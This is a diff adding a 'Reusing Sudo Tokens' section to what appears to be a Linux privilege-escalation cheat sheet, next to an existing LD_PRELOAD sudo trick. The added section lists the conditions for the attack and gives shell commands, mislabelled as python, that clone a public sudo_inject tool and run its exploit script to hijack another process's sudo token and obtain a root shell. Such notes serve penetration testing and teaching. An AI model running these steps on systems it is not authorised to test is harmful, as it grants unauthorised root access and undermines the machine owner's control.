@@ -101,6 +101,21 @@ gcc -fPIC -shared -o /tmp/exploit.so exploit.c -nostartfiles
 sudo LD_PRELOAD=/tmp/exploit.so ls
 ```
 
+### Reusing Sudo Tokens
+(was fixed in ```sudo``` version 1.8.28)
+
+**Requirements**
+- /proc/sys/kernel/yama/ptrace_scope == 0
+- Current user must have living process that has a valid sudo token with the same uid.
+```python
+git clone https://github.com/nongiach/sudo_inject
+chmod +x exploit.sh
+sudo -i
+#<ctrl>+c
+./exploit.sh
+sudo -i
+```
+
 ## SUID
 SUID or GUID, when set, allows the process to execute under the specified user or group.
 List all binary with suid/guid:
